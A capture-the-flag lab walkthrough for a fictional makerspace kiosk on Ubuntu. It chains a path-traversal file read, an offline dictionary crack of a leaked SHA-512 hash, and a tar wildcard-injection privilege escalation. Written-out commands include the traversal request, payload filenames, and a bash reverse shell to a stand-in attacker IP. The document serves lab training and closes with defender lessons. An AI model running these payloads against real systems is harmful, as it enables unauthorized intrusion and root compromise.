# MakerNest — Lab Walkthrough

**Theme:** MakerNest is a fictional community makerspace running a small
self-hosted kiosk app so members can reserve shared equipment (3D printers,
laser cutter, CNC mill). The kiosk's "export report" feature was built by an
intern for an open-day demo and never hardened — it reads a filename
straight off the URL with no path checking. A second, unrelated leftover
(a retired Basic-Auth credential file from an old admin tools page) and a
third, unrelated automation job (a group-writable nightly archive script)
complete the chain to root.

**Target OS:** Ubuntu Server (Linux) — chosen at random for this rotation.

**Scope / Legal notice:** This walkthrough is for use against the
`setup_makernest.sh` target running on your own isolated lab VM only. Do
not run these techniques against systems you do not own or lack explicit
authorization to test.

**Flags:**
- `EASY_FLAG.txt` — found in `kiosk_ops`'s home directory immediately
  after logging in with the credential leaked via path traversal.
- `INTERMEDIATE_FLAG.txt` — found after cracking a leaked password hash
  and pivoting to `toolsmith`.
- `HARD_FLAG.txt` — found after privilege escalation to root via a
  tar-wildcard injection in a group-writable archive job.

---

## Part 0 – Build

1. Provision a fresh Ubuntu Server 22.04/24.04 VM in an isolated,
   host-only or NAT'd network (no bridged/public NIC).
2. Copy `setup_makernest.sh` to the VM.
3. Run it:
   ```bash
   chmod +x setup_makernest.sh
   sudo ./setup_makernest.sh
   ```
4. Snapshot the VM once the script finishes — this is your clean
   restore point.
5. From your attacker VM (Kali, ParrotOS, etc.), confirm connectivity
   to the target's IP on the isolated network.

---

## Part 1 – Enumeration

Start with a full TCP port scan:

```bash
nmap -sC -sV -p- <target-ip> -oN nmap_full.txt
```

- `-sC` — run nmap's default script set (banner grabs, common misconfig
  checks) against open ports.
- `-sV` — probe open ports to determine service/version.
- `-p-` — scan all 65535 TCP ports instead of just the top 1000.
- `-oN nmap_full.txt` — save human-readable output for later reference.

Expect to see:
- `22/tcp` — OpenSSH
- `80/tcp` — Apache httpd, PHP

For directory discovery on this box, use `ffuf` instead of gobuster —
same idea, different tool, for practice with the variety available on
Kali:

```bash
ffuf -u http://<target-ip>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
```

- `-u http://<target-ip>/FUZZ` — `FUZZ` marks where each wordlist entry
  gets substituted.
- `-w /usr/share/wordlists/dirb/common.txt` — a generic, widely-reused
  filename/directory list; `kiosk` and `backups` are both exactly the
  kind of generic entries it's built to catch.
- `-mc 200,301,302` — only show hits with these HTTP status codes.

This turns up:
```
kiosk                   [Status: 301]
```

Fuzz inside it the same way:

```bash
ffuf -u http://<target-ip>/kiosk/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php -mc 200,301,302
```

This surfaces `/kiosk/export.php`. The homepage itself also links to it
directly, so a quick look at the page source would have found it too:

```bash
curl -s http://<target-ip>/ | grep -i href
```

```
<p><a href="kiosk/export.php?report=weekly_usage.txt">View weekly usage report</a></p>
```

Fetch it as intended, to see the normal behavior before poking at it:

```bash
curl "http://<target-ip>/kiosk/export.php?report=weekly_usage.txt"
```

You'll get back a plain-text equipment usage report — this is the
legitimate feature the `report` parameter is meant to serve.

---

## Part 2 – Identify Vulnerabilities

Three separate weaknesses need to be chained here before you reach root.

### 2a. Path traversal in the kiosk report export (initial access)

The `report` parameter is concatenated directly onto a base directory
with no filtering — no check for `../`, no allow-list of report names.
That means anything the web server process (`www-data`) can read is
fair game, not just files inside the reports folder.

### 2b. Crackable password hash in a leftover legacy auth file
     (lateral movement, exploited in Part 4)

Not visible yet — this is discovered *after* you have a shell as
`kiosk_ops`, in Part 4.

### 2c. Group-writable staging directory for a root tar job
     (privilege escalation, confirmed in Part 5)

Also not visible yet — discovered after landing on `toolsmith`.

---

## Part 3 – Gain Access

Exploit the path traversal to walk out of the reports directory. The
kiosk's own config file lives at `/etc/makernest/kiosk.conf`, and
`www-data` can read it (it's group-readable by `www-data`):

```bash
curl "http://<target-ip>/kiosk/export.php?report=../../../../etc/makernest/kiosk.conf"
```

- Each `../` climbs one directory level up from
  `/var/lib/makernest/reports/`; four of them is more than enough to
  reach the filesystem root, from which `etc/makernest/kiosk.conf` is
  an absolute path. `export.php` never validates or strips these
  sequences, so PHP's `file_exists()`/`readfile()` follow them exactly
  as given.

This returns:

```
; MakerNest kiosk terminal config
; local front-desk login used to unlock the reservation terminal each morning
kiosk_user = kiosk_ops
kiosk_pass = butterfly1
```

A plaintext operator credential. Before trying it, you could also
validate it against SSH for practice with a different brute-force
tool than usual — `ncrack` instead of Hydra/Medusa (it ships on Kali
alongside them and is handy for this kind of single-credential
confirmation run). On Kali, `rockyou.txt` ships gzipped — unzip it
first if you haven't already:

```bash
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
ncrack -p 22 --user kiosk_ops -P /usr/share/wordlists/rockyou.txt <target-ip>
```

- `-p 22` — target port (SSH).
- `--user kiosk_ops` — the single username leaked from the config file.
- `-P /usr/share/wordlists/rockyou.txt` — password wordlist to try.
- This will recover `kiosk_ops:butterfly1` quickly since the password
  is a genuine, early-ish entry in `rockyou.txt` — but you already have
  it directly from the leaked config, so this step is optional practice
  rather than a required part of the chain.

SSH in with the leaked credential:

```bash
ssh kiosk_ops@<target-ip>
# password: butterfly1
```

Grab the first flag straight away:

```bash
cat ~/EASY_FLAG.txt
```

**🚩 EASY_FLAG captured** — this one only required the path-traversal
leak, no cracking required.

---

## Part 4 – Lateral Movement / Intermediate Challenge

As `kiosk_ops`, look for anything MakerNest-related outside your home
directory. Use `-ipath` rather than `-iname` here — the string
"makernest" shows up in the *directory* names (`/etc/makernest/`,
`/var/backups/makernest/`), not in the files' own filenames, so a
plain `-iname` search would miss them:

```bash
find / -ipath "*makernest*" -type f 2>/dev/null
```

```
/etc/makernest/kiosk.conf
/var/backups/makernest/toolsmith.htpasswd
/usr/local/sbin/makernest_archive.sh
/etc/cron.d/makernest-archive
/etc/cron.d/makernest-heartbeat
/var/backups/makernest-exports.tar.gz
```

`makernest-heartbeat` and the `.tar.gz` are the harmless heartbeat cron
and the archive job's own output — not part of the intended path. The
`.htpasswd` file is the one worth reading.

The `.htpasswd` file stands out. Read it:

```bash
cat /var/backups/makernest/toolsmith.htpasswd
```

```
# legacy admin-tools basic-auth file - retired 2024, .htaccess removed
# TODO: delete this file, it's no longer used (never actioned)
toolsmith:$6$makernest$...
```

That `$6$...` prefix is a real SHA-512 **crypt hash**, not an encoding
— there's nothing to decode here, it has to be cracked offline. Save
just the credential line to a file on the target:

```bash
echo 'toolsmith:$6$makernest$...' > /tmp/toolsmith.hash
```

`john` lives on your Kali attacker box, not on this Ubuntu target, so
pull the hash file across before cracking it. From a terminal **on
Kali** (not this SSH session into the target):

```bash
scp kiosk_ops@<target-ip>:/tmp/toolsmith.hash .
# password: butterfly1
```

Still on Kali, in the directory you copied it to, unzip `rockyou.txt`
if you haven't already and run John against it:

```bash
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/toolsmith.hash
john --show toolsmith.hash
```

- John auto-detects the crypt format from the `$6$` prefix (SHA-512
  crypt), so no `--format` flag is needed here.
- `--show` — after a successful crack, print the recovered plaintext
  password without re-running the attack.

This recovers `toolsmith:chocolate1`. Switch back to your SSH session
on the target and use it (your session is a real TTY, so `su` works
fine here):

```bash
su toolsmith
# password: chocolate1
```

Grab the intermediate flag from its home directory:

```bash
cat ~/INTERMEDIATE_FLAG.txt
```

**🚩 INTERMEDIATE_FLAG captured.**

(The credential also works directly over SSH if you'd rather pivot
that way instead of `su` — either gets you the same shell.)

---

## Part 5 – Privilege Escalation

From your `toolsmith` shell, check your group memberships:

```bash
id
```

```
uid=1001(toolsmith) gid=1001(toolsmith) groups=1001(toolsmith),1002(makerops)
```

You're in `makerops`. The files you found in Part 4 already pointed at
a cron job — look at what it actually does:

```bash
cat /etc/cron.d/makernest-archive
cat /usr/local/sbin/makernest_archive.sh
```

```
* * * * * root /usr/local/sbin/makernest_archive.sh
```
```
cd /var/lib/makernest/export_stage || exit 1
tar -czf /var/backups/makernest-exports.tar.gz * 2>/dev/null
```

Root runs this every minute, and it `tar`s up everything in
`/var/lib/makernest/export_stage` using a shell-expanded wildcard
(`*`). Check who can write there:

```bash
ls -ld /var/lib/makernest/export_stage
```

```
drwxrwxr-x 2 root makerops 4096 ... /var/lib/makernest/export_stage
```

Group-writable by `makerops` — and this is a completely different bug
from the file-read in Part 3 or the leaked hash in Part 4. When `tar`
expands a bare `*` inside a directory you control, any filenames you've
planted that *look like tar command-line options* get passed to tar as
options, not as archive members — a classic wildcard-injection
primitive (the same family of bug GTFOBins documents for several other
tools). Build the payload:

```bash
cd /var/lib/makernest/export_stage

cat > shell.sh <<'EOF'
#!/bin/bash
cp /root/HARD_FLAG.txt /tmp/root_flag_out.txt
chmod 644 /tmp/root_flag_out.txt
EOF
chmod +x shell.sh

touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

- `shell.sh` — the command you want root to run; here it just copies
  the flag somewhere you can read, but it could just as easily drop a
  reverse shell.
- `--checkpoint=1` — as a *filename*, this is meaningless to tar; but
  once the wildcard `*` expands and this filename is handed to tar as
  an argument, tar reads it as the real `--checkpoint=1` **option**,
  telling it to run checkpoint actions after every 1 file processed.
- `--checkpoint-action=exec=sh shell.sh` — likewise gets read as the
  real tar option that runs an arbitrary shell command at each
  checkpoint — in this case, executing your `shell.sh`.
- Both "filenames" sort before `shell.sh` alphabetically, so wildcard
  expansion lists them first on tar's command line, ahead of the
  script they reference.

Wait up to a minute for the cron job to fire, then check the result:

```bash
sleep 65
cat /tmp/root_flag_out.txt
```

**🚩 HARD_FLAG captured.**

If you'd rather land an interactive root shell instead of just reading
the flag file, change `shell.sh` to a reverse shell and catch a
listener on your attacker box first:

```bash
# on your attacker box, before the next cron tick:
nc -lvnp 4444
```

```bash
cat > shell.sh <<'EOF'
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'
EOF
chmod +x shell.sh
```

Once the shell connects, confirm you're root:

```bash
id
```

You should see `uid=0(root)`.

---

## Part 6 – Capture the Three Flags

By the time you finish Part 5 you should have all three:

```bash
# Easy - kiosk_ops's home dir, reached via the path-traversal leak (Part 3)
cat /home/kiosk_ops/EASY_FLAG.txt

# Intermediate - toolsmith's home dir, reached via the cracked legacy hash (Part 4)
cat /home/toolsmith/INTERMEDIATE_FLAG.txt

# Hard - root's home dir, reached via the tar wildcard injection (Part 5)
cat /root/HARD_FLAG.txt
```

**🚩 EASY_FLAG, INTERMEDIATE_FLAG, and HARD_FLAG all captured.**

---

## Summary of the Vulnerability Chain

1. **Initial access — path traversal in a report-export endpoint:** the
   kiosk's `export.php?report=` parameter was concatenated directly
   onto a base directory with no filtering, letting an attacker walk
   out of the intended reports folder with `../` sequences and read any
   file `www-data` could see — including a config file with the
   front-desk operator's plaintext password.
2. **Lateral movement — a real password hash left in a retired
   Basic-Auth file:** an old admin-tools page's `.htpasswd`-style
   credential file was never deleted after the page itself was
   removed, and it stayed world-readable. Unlike the base64/base32/hex
   leaks seen elsewhere in this lab set, this one is a genuine SHA-512
   crypt hash, requiring an offline dictionary attack (John the Ripper)
   rather than simple decoding.
3. **Privilege escalation — tar wildcard injection via a group-writable
   staging directory:** a root cron job archived a directory's contents
   using an unquoted shell wildcard (`tar -czf ... *`). Because the
   directory was group-writable by an account the attacker had already
   reached, planting files named like tar's own command-line flags
   (`--checkpoint`, `--checkpoint-action=exec=...`) caused tar to
   execute an attacker-chosen command as root — a distinct escalation
   primitive from sudo rules, SUID/PATH-hijack binaries, writable
   cron/systemd scripts, or misassigned capabilities.

**Root cause lessons for defenders:**
- Never build a file-serving parameter (report name, filename, template
  ID, etc.) by simple string concatenation. Canonicalize the resulting
  path (e.g. `realpath()`) and confirm it's still inside the intended
  base directory before touching the filesystem.
- Delete retired authentication files along with the feature they
  protected — a `.htpasswd` file with no matching `.htaccess` is a
  pure liability with zero remaining benefit.
- Any script that runs with elevated privileges and expands a shell
  wildcard (`*`, `?`) over a directory that lower-privileged users can
  write to is vulnerable to argument injection. Use `--` to terminate
  option parsing before the wildcard (`tar -czf archive.tar.gz -- *`),
  or better, avoid globbing entirely and pass an explicit, validated
  file list.
- Treat any directory writable by a non-root group as untrusted input
  to whatever privileged process later reads from it.

---

## Cleanup

This VM is now permanently vulnerable by design — don't reuse it as a
general-purpose machine. When you're done with the lab session:

1. Power off the VM.
2. Revert to (or delete) your pre-attack snapshot from Part 0.
3. If you don't need it again, delete the VM and its virtual disk
   entirely rather than repurposing it.
4. Rotate/discard any credentials you typed into other tools while
   practicing (e.g., don't reuse `butterfly1` or `chocolate1` anywhere
   real).
